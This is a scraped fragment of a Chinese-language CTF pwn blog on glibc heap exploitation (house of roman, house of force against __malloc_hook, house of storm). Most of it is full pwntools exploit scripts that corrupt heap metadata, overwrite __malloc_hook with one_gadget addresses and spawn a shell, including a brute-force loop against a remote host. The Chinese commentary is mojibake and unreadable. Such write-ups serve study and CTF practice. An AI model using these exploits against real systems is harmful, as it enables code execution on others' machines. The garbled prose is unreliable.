process([&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;,&quot;./sys1&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)def menu(content):    p.sendafter(&#x27;HTTP_Parser&gt; &#x27;, content)def debug(s=&#x27;&#x27;):    gdb.attach(p, s)    pause()def quit():    header = f&#x27;&#x27;&#x27;POST /quit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzip\\n&#x27;&#x27;&#x27;    menu(header)cmd = &quot;&quot;&quot;dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elfb do_lookup_xb exit&quot;&quot;&quot;debug(cmd)quit()p.interactive()\nè¿™ä¸ªä½ç½®çš„while (++i &lt; n);éœ€è¦å…ˆè¿‡ä¸€æ¬¡ç„¶åå¼€å§‹æ‰¾é‚£å‡ ä¸ªå€¼\nè¿˜éœ€è¦æ‰¾åˆ°systemçš„st_valueå’Œst_name,è¿˜æ˜¯ç”¨è¿™ä¸ªç®€å•çš„ç¨‹åº\n//gcc sys1.c -fno-pie -g -o sys1#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;char *buff;read(0,buff,0x15);//ä¸ºäº†è®©ç¨‹åºé•¿ä¸€ç‚¹å¥½ä¸‹æ–­ç‚¹system(&quot;/bin/sh&quot;);return 0;&#125;\n\nexp:\nfrom pwn import *from pwn import p64, p32, p16, p8context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./muney&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)p = process([&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;,&quot;./muney&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)def debug(s=&#x27;&#x27;):    gdb.attach(p, s)    pause()lg = lambda x, y: log.success(f&#x27;&#123;x&#125;: &#123;hex(y)&#125;&#x27;)def menu(content):    p.sendafter(&#x27;HTTP_Parser&gt; &#x27;, content)def add(size):    header = f&#x27;&#x27;&#x27;POST /create HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipSize: &#123;size&#125;Content-Length: &#123;str(0x80)&#125;\\n&#x27;&#x27;&#x27;    payload = header + &#x27;a&#x27; * 0x80    menu(payload)def edit(index, offset, length, content):    header = f&#x27;&#x27;&#x27;POST /edit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipContent-Length: &#123;length&#125;Idx: &#123;index&#125;Offset: &#123;offset&#125;\\n&#x27;&#x27;&#x27;    payload = header.encode() + content    menu(payload)def delete(index):    header = f&#x27;&#x27;&#x27;POST /delete HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzipIdx: &#123;index&#125;\\n&#x27;&#x27;&#x27;    menu(header)def quit():    header = f&#x27;&#x27;&#x27;POST /quit HTTP/1.0Connection: Keep-AliveAccept-Encoding: gzip\\n&#x27;&#x27;&#x27;    menu(header)command = &quot;&quot;&quot;dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elfdir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elfdir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elf/dl-lookup.cb *0x4021CA&quot;&quot;&quot;debug(command)# quit()bitmask_offset = 0xb88bucket_offset = 0xcb0hasharr_offset = 0x1d7cexit_sym_offset = 0x4d20bitmask_word = 0xf000028c0200130ebucket = 0x86hasharr = 0x7c967e3e7c93f2a0exit_sym = 0x000f001200002efbst_value = 0x52290  # system offset libc baseadd(0x200000)edit(0, -8, 3, b&#x27;\\x02\\x10\\x21&#x27;)delete(0)add(0x211002)mmap_offset_libc = 0x201ff0edit(0, mmap_offset_libc + bitmask_offset, 2, p16(bitmask_word &amp; 0xffff))edit(0, mmap_offset_libc + bitmask_offset + 3, 2, p16(bitmask_word &gt;&gt; 24 &amp; 0xffff))edit(0, mmap_offset_libc + bitmask_offset + 5, 1, p16(bitmask_word &gt;&gt; 40 &amp; 0xff))edit(0, mmap_offset_libc + bitmask_offset + 7, 1, p16(bitmask_word &gt;&gt; 56 &amp; 0xff))edit(0, mmap_offset_libc + bucket_offset, 1, p8(bucket))edit(0, mmap_offset_libc + hasharr_offset, 8, p64(hasharr))edit(0, mmap_offset_libc + exit_sym_offset - 8, 2, p16(exit_sym &amp; 0xffff))edit(0, mmap_offset_libc + exit_sym_offset - 8 + 4, 1, p8(exit_sym &gt;&gt; 32 &amp; 0xff))edit(0, mmap_offset_libc + exit_sym_offset - 8 + 6, 1, p8(exit_sym &gt;&gt; 48 &amp; 0xff))edit(0, mmap_offset_libc + exit_sym_offset, 3, p32(st_value)[:-1])# debug()quit()p.interactive()\n\n\n\n","tags":["heap"]},{"title":"house_of_roman","url":"/2023/11/15/house-of-roman/","content":"åˆ·how2heapçš„æ—¶å€™çœ‹åˆ°çš„ä¸€ä¸ªå¥½ç©çš„æ‰“æ³•ï¼Œæœ¬åœ°ç¯å¢ƒè²Œä¼¼å¤ç°ä¸èµ·æ¥ï¼Œä»…ä½œè®°å½•ç¨‹åºæ¥æºhttps://github.com/romanking98/House-Of-RomanHouse-Of-RomanRCE through Leakless HeapFengShui, fastbin alloc anywhere.Was presented at DEFCON 26.\n[House-Of-Roman]new_challå¼€å±€æœ‰ä¸ªèƒ½å†™å…¥bssæ®µçš„æœºä¼šbsså®ç°äº†å¢åˆ æ”¹malloc_chunkï¼Œæ²¡æœ‰é™åˆ¶sizeï¼Œåªèƒ½ç”³è¯·19ä¸ªchunk\n__int64 malloc_chunk()&#123;  unsigned int v1; // [rsp+0h] [rbp-10h] BYREF  _DWORD size[3]; // [rsp+4h] [rbp-Ch] BYREF  printf(&quot;Enter size of chunk :&quot;);  __isoc99_scanf(&quot;%d&quot;, size);  printf(&quot;Enter index :&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &lt;= 0x13 )  &#123;    *(_QWORD *)&amp;size[1] = malloc(size[0]);    heap_ptrs[v1] = *(_QWORD *)&amp;size[1];    sizes[v1] = size[0];    return *(_QWORD *)&amp;size[1];  &#125;  else  &#123;    puts(&quot;Invalid index&quot;);    return 0LL;  &#125;&#125;\nwrite_chunk,å­˜åœ¨off_by_oneæ¼æ´\nint write_chunk()&#123;  unsigned int v1; // [rsp+8h] [rbp-8h] BYREF  int v2; // [rsp+Ch] [rbp-4h]  printf(&quot;\\nEnter index of chunk :&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &gt; 0x13 )    return puts(&quot;\\nInvalid index&quot;);  if ( !heap_ptrs[v1] )    return puts(&quot;Bad index&quot;);  v2 = sizes[v1];  printf(&quot;Enter data :&quot;);  return read(0, (void *)heap_ptrs[v1], v2 + 1);//off_by_one&#125;\nfree_chunkå­˜åœ¨UAF\nvoid free_chunk()&#123;  unsigned int v0; // [rsp+Ch] [rbp-4h] BYREF  printf(&quot;\\nEnter index :&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v0);  if ( v0 &lt;= 0x13 )    free((void *)heap_ptrs[v0]);&#125;\n\nexpè§£è¯´é“¾æ¥:https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc\nfrom pwn import *from pwn import p64p = process(&quot;./new_chall&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.24.so&quot;&#125;)#raw_input()def debug():\tgdb.attach(p)\tpause()def menu():\tp.recvuntil(b&quot;3. Free&quot;)def create(size,idx):\tmenu()\tp.sendline(b&quot;1&quot;)\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(size))\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(idx))def free(idx):\tmenu()\tp.sendline(b&quot;3&quot;)\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(idx))def edit(idx,data):\tmenu()\tp.sendline(b&quot;2&quot;)\tp.recvuntil(b&quot;:&quot;)\tp.sendline(str(idx))\tsleep(0.1)\tp.send(data)name = b&quot;A&quot;*20p.recvlineuntil(b&quot;Enter name :&quot;)p.sendline(name)debug()create(24,0)create(200,1)fake = b&quot;A&quot;*104fake += p64(0x61)edit(1,fake)create(101,2)free(1)create(200,1)over = b&quot;A&quot;*24over += b&quot;\\x71&quot;edit(0,over)create(101,3)create(101,15)create(101,16)create(101,17)create(101,18)create(101,19)free(2)free(3)heap_po = b&quot;\\x20&quot;edit(3,heap_po)arena_po = b&quot;\\xcd\\x4a&quot;edit(1,arena_po)#raw_input()create(101,0)create(101,0)create(101,0)#p.interactive()# Control arena through 0.# Now unsorted bin attack.# First fix 0x71 freelist.free(15)edit(15,p64(0x00))# Fixed.# 0x7f702619777bcreate(200,1)create(200,1)create(24,2)create(200,3)create(200,4)free(1)po = b&quot;B&quot;*8po += b&quot;\\xe0\\x4a&quot;edit(1,po)create(200,1)#5b394fover = b&quot;R&quot;*19over += b&quot;\\x4f\\x39\\x5b&quot;edit(0,over)create(200,7)try:\tresp = p.recv(4, timeout=6)\tp.interactive()except:\tp.close()\n\nè¯¥æ–¹æ³•åœ¨aslrå¼€å¯ä¸‹éœ€è¦çˆ†ç ´æ•°æ®ï¼Œçœ‹è¿æ°”ä»¥ä¸‹æ–¹æ³•æ¥è‡ªhttps://xz.aliyun.com/t/7426#toc-1ç”¨IO_FILEæ³„éœ²äº†libcåœ°å€ï¼Œæœ‰1&#x2F;16çš„æ¦‚ç‡æ‰“é€š\n#coding:utf8from pwn import*def add(size,idx):    #p.sendline(&quot;1&quot;)    #p.sendline(str(size))    #p.sendline(str(idx))    p.sendlineafter(&#x27;Free&#x27;,&quot;1&quot;)    p.sendlineafter(&#x27;Enter size of chunk :&#x27;,str(size))    p.sendlineafter(&#x27;Enter index :&#x27;,str(idx))def free(idx):    p.sendlineafter(&#x27;Free&#x27;,&quot;3&quot;)    p.sendlineafter(&#x27;Enter index :&#x27;,str(idx))def edit(idx,data):    #p.recvuntil(&#x27;Free&#x27;)    #p.sendline(&#x27;2&#x27;)    #p.recvuntil(&#x27;Enter index of chunk :&#x27;)    #p.sendline(str(idx))    #p.recvuntil(&#x27;Enter data :&#x27;)    #p.send(data)    p.sendlineafter(&#x27;Free&#x27;,&quot;2&quot;)    p.sendlineafter(&#x27;Enter index of chunk :&#x27;,str(idx))    p.sendafter(&#x27;Enter data :&#x27;,data)p = process(&#x27;./new_chall&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;,checksec=False)context.log_level =&#x27;DEBUG&#x27;p.sendlineafter(&#x27;Enter name :&#x27;,&#x27;FMYY&#x27;)add(0x18,0)add(0xC8,1)add(0x68,2)edit(1,&#x27;\\x00&#x27;*0x68 + p64(0x61))free(1)add(0xC8,1)add(0x68,3)add(0x68,4)add(0x68,5)edit(0,&#x27;\\x00&#x27;*0x18 + &#x27;\\x71&#x27;)free(2)free(3)edit(3,&#x27;\\x20&#x27;)edit(1,&#x27;\\xDD\\x25&#x27;)add(0x68,9)add(0x68,9)payload = &#x27;\\x00&#x27;*0x33 + p64(0xFBAD1800) + p64(0)*3 + &#x27;\\x88&#x27;add(0x68,9)edit(9,payload)#ä¿®æ”¹stdoutçš„flagä½ä¸º0xfbad1800#bingå°†_IO_write_baseçš„æœ€åä¸€ä¸ªå­—èŠ‚æ”¹å°ï¼Œä»è€Œå®ç°å¤šè¾“å‡ºä¸€äº›å†…å®¹ï¼Œè¿™äº›å†…å®¹é‡Œé¢å°±åŒ…å«äº†libcåœ°å€ã€‚libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;).ljust(8,&#x27;\\x00&#x27;)) - libc.symbols[&#x27;_IO_2_1_stdin_&#x27;]libc.address = libc_basefree(4)edit(4,p64(0))add(0x68,0)free(0)edit(0,p64(libc.symbols[&#x27;__malloc_hook&#x27;] - 0x23))add(0x68,0)add(0x68,0)p.sendlineafter(&#x27;Free&#x27;,&#x27;2&#x27;)p.sendlineafter(&#x27;Enter index of chunk :&#x27;,&#x27;0&#x27;)p.send(&#x27;\\x00&#x27;*0x13+p64(libc_base+0xF02A4))#å‘malloc_hook åœ°å€é‡Œå†™å…¥ onegadget #free åŒä¸€ä¸ª chunk å¤šæ¬¡ï¼Œé€ æˆ double free å¼‚å¸¸ï¼Œè§¦å‘ malloc_printerr ï¼Œè§¦å‘malloc,getshellã€‚free(1)free(1)p.interactive()\n\n#[0CTF&#x2F;TCTF 2018 finals]freenote2018å¢åˆ æ”¹ï¼ˆæŸ¥åªæ˜¯ä¸ªå£³å­ï¼‰init_note é™åˆ¶äº†15ä¸ªchunkï¼Œsizeä¸º0x1åˆ°0x100\n__int64 sub_B4E()&#123;  unsigned int v1; // [rsp+Ch] [rbp-124h]  unsigned int v2; // [rsp+10h] [rbp-120h]  int v3; // [rsp+14h] [rbp-11Ch]  void *dest; // [rsp+18h] [rbp-118h]  char buf[264]; // [rsp+20h] [rbp-110h] BYREF  unsigned __int64 v6; // [rsp+128h] [rbp-8h]  v6 = __readfsqword(0x28u);  v1 = 0;  if ( (unsigned int)dword_20203C &lt;= 0xF &amp;&amp; (printf(&quot;Input the note length:&quot;), v3 = sub_A80(), v3 &gt; 0) &amp;&amp; v3 &lt;= 256 )  &#123;    printf(&quot;Input the note content:&quot;);    v2 = read(0, buf, 0xFFuLL);    if ( v2 &gt; v3 )      v2 = v3;    dest = malloc(v3 + 8);    if ( dest &amp;&amp; v2 )      memcpy(dest, buf, v2 - 1);    while ( dword_202048[4 * v1] )      ++v1;    *((_QWORD *)&amp;unk_202040 + 2 * (int)v1) = dest;    dword_202048[4 * v1] = v3;    ++dword_20203C;    printf(&quot;Here is your label: %d\\n&quot;, v1);    puts(&quot;Done~!&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;Not allow~!&quot;);    return 1LL;  &#125;&#125;\neditæ²¡æœ‰æº¢å‡º\n__int64 sub_D43()&#123;  unsigned int v1; // [rsp+8h] [rbp-8h]  printf(&quot;Input the note index:&quot;);  v1 = sub_A80();  if ( v1 &lt; 0x11 &amp;&amp; dword_202048[4 * v1] )  &#123;    printf(&quot;Input the note content:&quot;);    read(0, *((void **)&amp;unk_202040 + 2 * (int)v1), (unsigned int)dword_202048[4 * v1]);    puts(&quot;Done~!&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;Not allow~!&quot;);    return 1LL;  &#125;&#125;\nfreeå­˜åœ¨UAF\n__int64 sub_E1E()&#123;  unsigned int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;Input the note index:&quot;);  v1 = sub_A80();  if ( v1 &lt; 0x11 &amp;&amp; dword_202048[4 * v1] )  &#123;    free(*((void **)&amp;unk_202040 + 2 * (int)v1));    puts(&quot;Done~!&quot;);    return 0LL;  &#125;  else  &#123;    puts(&quot;Not allow~!&quot;);    return 1LL;  &#125;&#125;\nHouse of romanï¼Œéœ€è¦çˆ†ç ´12bitsçš„æ•°æ®å †é£æ°´å‘œå‘œå‘œ\nfrom pwn import *import tracebackdef init_note(size, content):    p.sendlineafter(&#x27;Choice:&#x27;, &#x27;1&#x27;)    p.sendlineafter(&#x27;Input the note length:&#x27;, str(size))    p.sendafter(&#x27;Input the note content:&#x27;, content)def edit_note(index, size, content):    p.sendlineafter(&#x27;Choice:&#x27;, &#x27;2&#x27;)    p.sendlineafter(&#x27;Input the note index:&#x27;, str(index))    p.sendafter(&#x27;Input the note content:&#x27;, content)def free_note(index):    p.sendlineafter(&#x27;Choice:&#x27;, &#x27;3&#x27;)    p.sendlineafter(&#x27;Input the note index:&#x27;, str(index))with context.quiet:    try_count = 0    # since we are replacing some addresses partially, and ASLR is enabled    # we are executing the program over and over again until we get lucky    while True:        try:            try_count += 1            print (sys.stderr, &#x27;Try #&#123;&#125;&#x27;.format(try_count))            #p = process(&#x27;./program&#x27;, env = &#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.23.so&#x27;&#125;)            p = remote(&quot;192.168.63.133&quot;, 10001)            # chunk#0 (0x81)            init_note(0x68, &#x27;a&#x27; * 255)            # chunk#1 (0x81)            init_note(0x68, &#x27;b&#x27; * 255)            # chunk#2 (0x91)            init_note(0x78, &#x27;c&#x27; * 255)            # chunk#3 (0x71)            init_note(0x60, &#x27;d&#x27; * 255)            # chunk#4 (0x71)            init_note(0x60, &#x27;e&#x27; * 255)            # launch double free attack            # fastbin free list (0x80): chunk#0 --&gt; chunk#1 --&gt; chunk#0            free_note(0)            free_note(1)            free_note(0)            # chunk#5 (0x81)            # this chunk is co-located with chunk#0, so we partially overwrite the fd pointer            init_note(0x68, p8(0xe0) + b&#x27;\\n&#x27;)            # chunk#6 (0x81)            # this chunk is co-located with chunk#1            init_note(0x68, b&#x27;b&#x27; * 0x50 + p64(0) + p64(0x81) + p64(0))            # chunk#7 (0x81)            # this chunk is co-located with chunk#0, so we partially overwrite the fd pointer            # after this allocation will put a heap address in fastbin free list            init_note(0x68, b&#x27;a&#x27; * 255)            # freeing chunk#2 will put it in the unsorted bin and set the fd/bk pointers with libc address            free_note(2)            # chunk#8 (0x81)            # this chunk is a fake chunk which is located a little before chunk#2            # basically, we overwrite chunk#2&#x27;s size and partially its fd which is pointing to somewhere before malloc_hook            # the first 12 bits is fixed, but the next 4 bits have to be 1            init_note(0x68, b&#x27;b&#x27; * 0x10 + p64(0) + p64(0x71) + p16(0x1aed) + b&#x27;\\n&#x27;)            # launch double free attack            # fastbin free list (0x70): chunk#4 --&gt; chunk#3 --&gt; chunk#4            free_note(4)            free_note(3)            free_note(4)            # chunk#9 (0x71)            # this chunk is co-located with chunk#4, so we partially overwrite the fd pointer to somewhere before malloc_hook            init_note(0x60, p8(0x00) + b&#x27;\\n&#x27;)            # chunk#10 (0x71)            # this chunk is co-located with chunk#3            init_note(0x60, b&#x27;d&#x27; * 255)            # chunk#11 (0x71)            # this chunk is co-located with chunk#4            # after this allocation, address of chunk#2 will be put in the fastbin free list            init_note(0x60, b&#x27;f&#x27; * 255)            # chunk#12 (0x71)            # this chunk is co-located with chunk#2            # after this allocation, the address before malloc_hook will be put in the fastbin free list            init_note(0x60, b&#x27;\\n&#x27;)            # chunk#13 (0x7f)            # this chunk is located before __malloc_hook            init_note(0x60, b&#x27;\\n&#x27;)            # fix unsorted bin chunk#2 size to look like a non-fastbin chunk            # also overwrite bk pointer of chunk#2 which points to 16 bytes before __malloc_hook            # preparing for unsorted_bin_attack            edit_note(8, 0x29, b&#x27;b&#x27; * 0x10 + p64(0) + p64(0x91) + p64(0) + p8(0x00))            # chunk#14 (0x91)            # allocate a chunk from unsorted bin, so the __malloc_hook will be overwritten with a libc address            init_note(0x78, b&#x27;\\n&#x27;)            &#x27;&#x27;&#x27;            0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)            constraints:                [rsp+0x30] == NULL            &#x27;&#x27;&#x27;            # overwrite __malloc_hook partially to point to the one gadget            # the first 12 bits is fixed, but the next 12 bits have to be a52            edit_note(13, 0x13 + 3, b&#x27;\\x00&#x27; * 0x13 + p32(0xa5226a)[0:3])            # chunk#15            # trigger __malloc_hook            init_note(0x100, b&#x27;\\n&#x27;)            p.clean()            p.sendline(b&#x27;ls&#x27;)            p.recv(0)            p.interactive()            break        except EOFError:            p.close()        except:            print ( sys.stderr, traceback.format_exc())            break","categories":["heap"],"tags":["bin"]},{"title":"malloc_hook","url":"/2023/09/07/malloc-hook/","content":"glibc2.30åå¢åŠ äº†å¯¹mallocçš„æ£€æŸ¥ï¼Œmalloc_hookæ‰‹æ³•å·²ç»ä¸å¯ç”¨ç›´æ¥ä¸Šä¾‹é¢˜gyctf_2020_forcechecksec\n[*] &#x27;/var/run/vmblock-fuse/blockdir/Zf5bfF/force&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nçœ‹çœ‹addå‡½æ•°\nunsigned __int64 sub_A20()&#123;  const void **i; // [rsp+0h] [rbp-120h]  __int64 size; // [rsp+8h] [rbp-118h]  char s[256]; // [rsp+10h] [rbp-110h] BYREF  unsigned __int64 v4; // [rsp+118h] [rbp-8h]  v4 = __readfsqword(0x28u);  memset(s, 255, sizeof(s));  for ( i = (const void **)&amp;unk_202080; *i; ++i )    ;  if ( (char *)i - (char *)&amp;unk_202080 &gt; 39 )    exit(0);  puts(&quot;size&quot;);  read(0, nptr, 0xFuLL);  size = atol(nptr);  *i = malloc(size);   //æ²¡æœ‰é™åˆ¶chunk_size  if ( !*i )    exit(0);  printf(&quot;bin addr %p\\n&quot;, *i);//ä¼šæ‰“å°å †åœ°å€  puts(&quot;content&quot;);  read(0, (void *)*i, 0x50uLL);//å­˜åœ¨å †æº¢å‡ºï¼Œå½“ç”³è¯·çš„chunk_size &lt; 0x50æ—¶  puts(&quot;done&quot;);  return __readfsqword(0x28u) ^ v4;&#125;\none_gadgets\n0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\nå…ˆæ‰“house_of_forceï¼Œæ‹¿ætop_chunkåŒæ—¶ï¼Œåœ¨åˆ†é…ç¬¬ä¸€ä¸ªchunkæ—¶ï¼Œç¨‹åºè¿˜ä¼šæ‰“å°å‡ºbin_addr,å¯ä»¥åˆ©ç”¨æ­¤æ³„éœ²libc_addr\n__realloc_hook å’Œ __malloc_hookè¿™ä¸¤ä¸ªé’©å­å‡½æ•°æ˜¯ç›¸é‚»çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŒä¸€ä¸ªchunkæ¥åŠ«æŒ__malloc_hookä¸ºrealloc+0x10ï¼Œå¹¶åŠ«æŒ__realloc_hookä¸ºone_gadget\nå†æ¬¡æ‰§è¡Œmallocå³å¯getshell\nfrom pwn import *#p = process(&#x27;./force&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,27065)libc = ELF(&quot;buu_libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def add(size, content):    p.recvuntil(&quot;2:puts\\n&quot;)    p.sendline(&quot;1&quot;)    p.recvuntil(&quot;size\\n&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;bin addr &quot;)    info = p.recvuntil(&quot;\\n&quot;, drop=True)    # print(info)    info = int(info.decode(&quot;ISO-8859-1&quot;), 16)    p.recvuntil(&quot;content\\n&quot;)    p.send(content)    return infoone_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]libc.address = add(0x200000, &#x27;chunk0\\n&#x27;) + 0x200ff0 #gdbæ‰¾åç§»ï¼Œleak_libc_base &amp;&amp; house_of_forceæ‹¿ætopchunksuccess(&#x27;libc_base&#x27;+hex(libc.address))heap_addr = add(0x18,b&#x27;a&#x27;*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF)) #leak_heap_addr &amp;&amp;ä¿®æ”¹topchunkçš„sizeä¸º0xFFFFFFFFFFFFFFFFsuccess(&quot;heap_addr:&quot;+hex(heap_addr))top = heap_addr + 0x10          #leak_topchunk_addrmalloc_hook = libc.sym[&#x27;__malloc_hook&#x27;] #get_malloc_hook_addrsuccess(&quot;malloc_hook:&quot;+hex(malloc_hook))realloc = libc.sym[&quot;__libc_realloc&quot;]offset = malloc_hook - topsystem = libc.sym[&#x27;system&#x27;]bin_sh = libc.search(b&#x27;/bin/sh&#x27;)success(&quot;system:&quot; + hex(system))success(&quot;bin_sh:&quot; + str(bin_sh))#debug()#one_gadget + libc.address -&gt; è®¡ç®—åç§»,ä½¿topchunkè½åœ¨malloc_hookå¤„#æ­¤æ—¶ç”³è¯·ä¸€ä¸ªchunkï¼Œå°±å¯ä»¥å®ç°ä¿®æ”¹malloc_hookå’Œrealloc_hookadd(offset-0x30,b&#x27;aaa\\n&#x27;)add(0x30,b&#x27;a&#x27;*8+p64(one_gadget[1] + libc.address)+p64(realloc+0x10))#hijack_malloc_hook#å†æ¬¡æ‰§è¡Œmallocï¼Œå³å¯getshellp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&#x27;1&#x27;)p.recvuntil(&quot;size\\n&quot;)p.sendline(str(20))p.interactive()","categories":["heap"],"tags":["hook"]},{"title":"house_of_storm","url":"/2023/10/13/house-of-storm/","content":"Iâ€™m the storm that is approching\nä»https://www.cnblogs.com/Rookle/p/13140339.htmlæ¥çš„å…³é”®æºç +æ³¨é‡Šorz\n//#define unsorted_chunks(M)          (bin_at (M, 1))//å¦‚æœunsorted binsä¸ä¸ºç©ºï¼Œä»å°¾åˆ°å¤´éå†unsorted binä¸­çš„æ¯ä¸ªchunkwhile ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;    bck = victim-&gt;bk;//å–å‡ºunsortedçš„å°¾éƒ¨çš„chunk    /*        æ£€æŸ¥å½“å‰éå†çš„ chunk æ˜¯å¦åˆæ³•ï¼Œchunk çš„å¤§å°ä¸èƒ½å°äºç­‰äº 2 * SIZE_SZï¼Œ        ä¹Ÿä¸èƒ½è¶…è¿‡ è¯¥åˆ†é…åŒºæ€»çš„å†…å­˜åˆ†é…é‡ã€‚ç„¶åè·å– chunk çš„å¤§å°å¹¶èµ‹å€¼ç»™ sizeã€‚        è¿™é‡Œçš„æ£€æŸ¥ä¼¼ä¹æœ‰ç‚¹å°é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨äº† victim-&gt;sizeï¼Œä½† victim-&gt;size         ä¸­åŒ…å«äº†ç›¸å…³çš„æ ‡å¿—ä½ä¿¡æ¯ï¼Œä½¿ç”¨ chunksize(victim) æ‰æ¯”è¾ƒåˆç†ï¼Œä½†åœ¨         unsorted bin ä¸­çš„ç©ºé—² chunk çš„æ‰€æœ‰æ ‡å¿—ä½éƒ½æ¸…é›¶äº†ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥         victim-&gt;size æ²¡æœ‰é—®é¢˜ã€‚    */    if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)        || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))        malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,                        chunk2mem(victim), av);    size = chunksize(victim);//è·å–victimçš„size\t/*        å¦‚æœè¦ç”³è¯·çš„å¤§å°åœ¨smallbinèŒƒå›´ ä¸” unsorted chunks åªæœ‰ä¸€ä¸ªchunkï¼Œä¸”        victimæ˜¯last_remainder ä¸” victimçš„sizeå¤§äºè¯·æ±‚çš„chunkçš„å¤§å°nbåŠ ä¸Š        (MINSIZE)æœ€å°chunkçš„size,é‚£ä¹ˆå°±åˆ‡å‰²remainder,ç„¶åè¿”å›victimã€‚                last_remainder æ˜¯ä¸€ä¸ª chunk æŒ‡é’ˆï¼Œåˆ†é…åŒºä¸Šæ¬¡åˆ†é… small chunk æ—¶ï¼Œ        ä»ä¸€ä¸ª chunk ä¸­åˆ† è£‚å‡ºä¸€ä¸ª small chunk è¿”å›ç»™ç”¨æˆ·ï¼Œåˆ†è£‚åçš„å‰©ä½™éƒ¨åˆ†        å½¢æˆä¸€ä¸ª chunkï¼Œlast_remainder å°±æ˜¯ æŒ‡å‘çš„è¿™ä¸ª chunkã€‚    */    if (in_smallbin_range(nb) &amp;&amp;        bck == unsorted_chunks(av) &amp;&amp;        victim == av-&gt;last_remainder &amp;&amp;        (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;        //åˆ†å‰²remainder        remainder_size = size - nb;//è®¡ç®—åˆ†å‰²åå‰©ä¸‹çš„size        remainder = chunk_at_offset(victim, nb);//è·å–remainderçš„åœ°å€        //æŠŠremainderåŠ å…¥unsorted binä¸­        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;        av-&gt;last_remainder = remainder; // è®¾ç½®last_remainderä¸ºremainder        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);        //å¦‚æœæ˜¯remainderåœ¨large binçš„èŒƒå›´ï¼Œåˆ™æŠŠfd_nextsize,fd_nextsizeæ¸…é›¶        if (!in_smallbin_range(remainder_size)) &#123;            remainder-&gt;fd_nextsize = NULL;            remainder-&gt;fd_nextsize = NULL;        &#125;\t\t//è®¾ç½®victimçš„size        set_head(victim, nb | PREV_INUSE |                 (av != &amp;main_arena ? NON_MAIN_ARENA : 0));        //è®¾ç½®remainderçš„size        set_head(remainder, remainder_size | PREV_INUSE);        //è®¾ç½®remainderçš„ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkçš„prev_size        set_foot(remainder, remainder_size);        check_malloced_chunk(av, victim, nb);//é»˜è®¤ä¸åšä»»ä½•æ“ä½œ        void *p = chunk2mem(victim);//å°†chunkæŒ‡é’ˆè½¬åŒ–ä¸ºmemæŒ‡é’ˆ        alloc_perturb(p, bytes);//å°†pçš„meméƒ¨åˆ†å…¨éƒ¨è®¾ç½®ä¸ºbytes ,é»˜è®¤ä»€ä¹ˆä¹Ÿä¸åš        return p;    &#125;    //æŠŠvictimä»unsorted bin ä¸­ç§»é™¤    unsorted_chunks(av)-&gt;bk = bck;    bck-&gt;fd = unsorted_chunks(av);    //å¦‚æœ victim çš„size ä¸ç”³è¯·çš„sizeç›¸ç­‰ï¼Œé‚£ä¹ˆå°±è¿”å›å…¶ã€‚    if (size == nb) &#123;        //è®¾ç½®victimç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªchunkçš„prev_inuseä½        set_inuse_bit_at_offset(victim, size);        //å¦‚æœavä¸æ˜¯main_arena 